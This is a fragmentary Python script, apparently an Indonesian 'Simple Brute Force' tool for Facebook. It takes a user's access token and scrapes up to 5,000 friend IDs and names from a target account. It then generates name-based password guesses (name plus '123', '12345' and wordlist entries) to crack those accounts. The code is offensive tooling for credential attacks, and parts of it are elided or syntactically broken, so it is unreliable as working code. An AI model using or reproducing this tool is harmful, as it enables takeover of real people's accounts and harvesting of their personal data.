...
def logo():
    print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Syafii •  │\n/___/____/_/     /____/  │ Github.com/muhammadsyafii12/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
def login(__widiya__):
    os.system('rm -rf token.txt');os.system('clear');logo();token = input('[•] Masukkan Token :\n\n')
    try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main(__widiya__))
    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__widiya__)
    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__widiya__)
def menu(__widiya__):
    ...
    print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik(__widiya__)
def crack_publik(__widiya__):
    ...
    try:
        ...
        except (KeyError,IOError):print('\n[!] ID Tidak Ditemukan');menu(__widiya__)
        try:r = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(i,token));id = [];z = json.loads(r.text);l = (b["first_name"]+".json").replace(" ","_");d = open(l,"w")
            id.append(a["id"]+"•"+a["name"]);d.write(a["id"]+"•"+a["name"]+"\n")
        print('[•] Total ID : %s'%(len(id)))
        return crack(l)
    except requests.Exception as e:exit('\n[!] Error : %s'%(e);password(__widiya__)
def password(__widiya__):
    __syafii__=[];ps = open('pass.txt','r').read();pp = open('passangka.txt','r').read()
    for i in __widiya__.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:__syafii__.append(i+"123");__syafii__.append(i+"12345")
        else:__syafii__.append(i);__syafii__.append(i+"123");__syafii__.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in __widiya__.split(" "):  
            i=i.lower()
            for x in pp.split(','):__syafii__.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):__syafii__.append(z)
    __syafii__.append(__widiya__.lower())
    return __syafii__
def cek_recode():
    try :
        __syafii__ = open('__syafii__.txt','r').read()
        if '__syafii__widiya__forever__' in __syafii__ : return menu(__syafii__)
...
def append():
    __syafii__=open('__syafii__.txt','w');__syafii__.write('__syafii__widiya__forever__');__syafii__.close
def koki(cookies):
    result=[]
